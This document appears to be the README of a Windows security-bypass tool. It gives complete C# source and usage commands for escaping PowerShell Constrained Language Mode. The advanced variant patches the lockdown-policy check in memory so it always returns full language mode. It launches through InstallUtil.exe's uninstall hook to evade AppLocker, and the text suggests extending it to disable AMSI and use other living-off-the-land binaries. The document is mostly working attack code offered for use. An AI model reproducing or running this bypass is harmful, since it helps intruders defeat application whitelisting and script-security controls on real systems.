# Constrained Language Mode (CLM) Bypass
A simple C# tool to execute PowerShell commands via a custom runspace.
Supports passing commands as arguments and printing the current PowerShell language mode.
## Usage - Basic
Check if the CLM is bypassed.
```PowerShell
.\CLM-Bypass.exe
```

Execute arbitary PowerShell command in a new custom runspace which should inherits **Full Language Mode**.
```PowerShell
.\CLM-Bypass.exe "whoami"
```

## Source Code - Basic
Here is the CSharp source code for customization
```C#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        using (var rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using (var ps = PowerShell.Create())
            {
                ps.Runspace = rs;

                if (args.Length == 0)
                {
                    ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    foreach (var r in ps.Invoke())
                        Console.WriteLine("LanguageMode: " + r);
                    return;
                }
                
                ps.AddScript(string.Join(" ", args), useLocalScope: true);
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r);
            }
        }
    }
}
```
## Usage - Advance
It will be executed as a part of `InstallUtil.exe` as the `uninstaller` for bypassing App Locker policy.
```PowerShell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:/Users/Public/CLM-Bypass-Advance.exe
```

## Source Code - Advance
- It force the DLL that is responsible for PowerShell App Locker integration to loaded in to the current process's memory.

- Then, it patch the method for checking PowerShell Language Policy directly on the memory to force it to always return `0` or `FullLanguage`.

- Then, it reloads the entire PowerShell engine to make the change effective.

- Attach with the override method if it is called with `InstallUtil.exe` on `Uninstaller` method.

- It is possible to add more function that should patch the memory on `AmsiBuffer` to disable AMSI on a new PowerShell session.

- IT is possible to add more handling function for integrating with the different LOLBAS rather than the `InstallUtil.exe`.

```C#
using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using Microsoft.PowerShell;
using System.Management.Automation.Runspaces;

namespace Patcher
{
    public class Program
    {
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddr, UIntPtr dwSize, uint flNewProt, out uint lpflOldProt);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpModuleName);

        public static void Main()
        {
            AppLockerPatch();
            ConsoleShell.Start(
                RunspaceConfiguration.Create(),
                "Reload PowerShell Engine", null,
                new[] { "-exec", "bypass", "-nop" }
            );
        }

        public static void AppLockerPatch()
        {
            var auth = typeof(System.Management.Automation.Alignment).Assembly;
            var method = auth.GetType("System.Management.Automation.Security.SystemPolicy")
                             .GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);

            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            var ptr = method.MethodHandle.GetFunctionPointer();
            VirtualProtect(ptr, new UIntPtr(4), 0x40, out uint old);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, ptr, 4);
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.Main();
        }
    }
}
```